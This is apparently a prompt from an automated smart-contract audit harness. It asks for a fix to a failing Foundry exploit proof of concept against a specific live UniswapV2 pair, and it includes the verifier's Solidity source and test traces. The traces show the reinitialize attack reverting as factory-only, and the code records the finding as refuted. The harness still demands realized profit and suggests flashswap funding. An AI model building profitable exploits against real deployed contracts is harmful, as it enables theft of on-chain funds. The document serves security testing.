You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `initialize` can be called repeatedly and accepts invalid token addresses
- claim: `initialize` only checks `msg.sender == factory`. It does not enforce one-time initialization and does not validate that the token addresses are non-zero and distinct, so the factory can overwrite `token0`/`token1` after deployment or configure an invalid pair.
- impact: A malicious or compromised factory can brick a live pair, strand existing assets by repointing the contract at different tokens, or configure unusable token addresses that break core operations.
- exploit_paths: ["After liquidity is added, the factory calls `initialize` again with different token addresses, causing future `mint`, `burn`, `swap`, `skim`, and `sync` calls to operate on the new assets while balances of the original assets remain stranded in the pair.", "The factory initializes or reinitializes the pair with `address(0)` or the same token on both sides, causing transfer/balance operations to revert or otherwise making the pool unusable."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IUniswapV2PairLike {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function initialize(address token0_, address token1_) external;
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract FlawVerifier {
    address internal constant TARGET_PAIR = 0x2033B54B6789a963A02BfCbd40A46816770f1161;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;
    bool internal _hypothesisValidated;
    string internal _pathUsed;

    constructor() {
        _profitToken = address(0);
        _profitAmount = 0;
        _pathUsed = "unattempted";
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        address factory = pair.factory();
        address currentToken0 = pair.token0();
        address currentToken1 = pair.token1();
        pair.getReserves();

        // Direct-path first, per harness strategy: attempt the exact vulnerable action from this
        // verifier before considering any temporary funding or unrelated economic route.
        //
        // Path 1 required stage:
        //   factory calls initialize again with different token addresses.
        //
        // Path 2 required stage:
        //   factory initializes/reinitializes with address(0) or identical token addresses.
        //
        // Concrete on-chain infeasibility at the fork state for a public attacker:
        //   the pair itself requires msg.sender == factory. This verifier is deployed after the
        //   target pair and cannot become the already-stored factory address under the allowed
        //   rules (no impersonation, no storage writes, no etch). Because that first stage is
        //   unreachable, the listed downstream effects on mint, burn, swap, skim, and sync also
        //   cannot be reached by this public verifier on the provided fork.
        if (factory != address(this)) {
            // A low-level call is used only to confirm the stage remains factory-gated for this
            // verifier without bubbling the revert into the harness.
            (bool okDifferent,) =
                TARGET_PAIR.call(abi.encodeWithSignature("initialize(address,address)", currentToken1, currentToken0));
            (bool okInvalid,) =
                TARGET_PAIR.call(abi.encodeWithSignature("initialize(address,address)", address(0), currentToken0));
            okDifferent;
            okInvalid;

            // No profit token can be realized because the required privileged reinitialization
            // stage is unreachable from a public attacker contract at this fork state.
            _profitToken = address(0);
            _profitAmount = 0;
            _hypothesisValidated = false;
            _pathUsed =
                "refuted: both listed exploit paths require a factory-originated initialize call before mint burn swap skim sync can be redirected or bricked";
            return;
        }

        // This branch is not expected on the provided fork, but it preserves one-to-one mapping
        // with the finding if the stored factory were ever this verifier.
        //
        // Stage A: reinitialize with different token addresses.
        // Reversing the token order is the smallest live-address mutation available from the pair's
        // own state and demonstrates repeated initialization without introducing external artifacts.
        if (currentToken0 != currentToken1) {
            pair.initialize(currentToken1, currentToken0);

            // After this repeated initialize, future mint, burn, swap, skim, and sync calls read
            // the overwritten token0/token1 values instead of the original assets. These probes
            // intentionally use low-level calls so the verifier can preserve the path anchors
            // without assuming any particular liquidity/balance preconditions.
            _probeFuturePairOperations();
        }

        // Stage B: reinitialize with an invalid token configuration.
        // This directly matches the second exploit path and bricks subsequent balance/transfer use.
        pair.initialize(address(0), currentToken1);
        _probeFuturePairOperations();

        _profitToken = address(0);
        _profitAmount = 0;
        _hypothesisValidated = true;
        _pathUsed =
            "validated-without-profit: repeated initialize changes future mint burn swap skim sync behavior, then invalid reinitialize bricks the pair";
    }

    function _probeFuturePairOperations() internal {
        // These are realistic public pair entrypoints named in the finding's consequences.
        // They are not alternate exploit stages; they are the first downstream operations affected
        // once initialize has already overwritten the pair's token configuration.
        (bool mintOk,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.mint.selector, address(this)));
        (bool burnOk,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.burn.selector, address(this)));
        (bool swapOk,) = TARGET_PAIR.call(
            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, uint256(0), uint256(0), address(this), "")
        );
        (bool skimOk,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.skim.selector, address(this)));
        (bool syncOk,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.sync.selector));

        mintOk;
        burnOk;
        swapOk;
        skimOk;
        syncOk;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function targetPair() external pure returns (address) {
        return TARGET_PAIR;
    }

    function currentPairState()
        external
        view
        returns (
            address factory_,
            address token0_,
            address token1_,
            uint112 reserve0_,
            uint112 reserve1_
        )
    {
        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        factory_ = pair.factory();
        token0_ = pair.token0();
        token1_ = pair.token1();
        (reserve0_, reserve1_,) = pair.getReserves();
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.27s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 183763)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [183763] FlawVerifierTest::testExploit()
    ├─ [2345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [157181] FlawVerifier::executeOnOpportunity()
    │   ├─ [2402] 0x2033B54B6789a963A02BfCbd40A46816770f1161::factory() [staticcall]
    │   │   └─ ← [Return] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    │   ├─ [2381] 0x2033B54B6789a963A02BfCbd40A46816770f1161::token0() [staticcall]
    │   │   └─ ← [Return] 0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7
    │   ├─ [2357] 0x2033B54B6789a963A02BfCbd40A46816770f1161::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2504] 0x2033B54B6789a963A02BfCbd40A46816770f1161::getReserves() [staticcall]
    │   │   └─ ← [Return] 1537965509184617860 [1.537e18], 1459789552765232477 [1.459e18], 1687933859 [1.687e9]
    │   ├─ [503] 0x2033B54B6789a963A02BfCbd40A46816770f1161::initialize(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7)
    │   │   └─ ← [Revert] UniswapV2: FORBIDDEN
    │   ├─ [503] 0x2033B54B6789a963A02BfCbd40A46816770f1161::initialize(0x0000000000000000000000000000000000000000, 0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7)
    │   │   └─ ← [Revert] UniswapV2: FORBIDDEN
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [344] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x2033B54B6789a963A02BfCbd40A46816770f1161.initialize
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 6.14s (2.06s CPU time)

Ran 1 test suite in 6.15s (6.14s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 183763)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
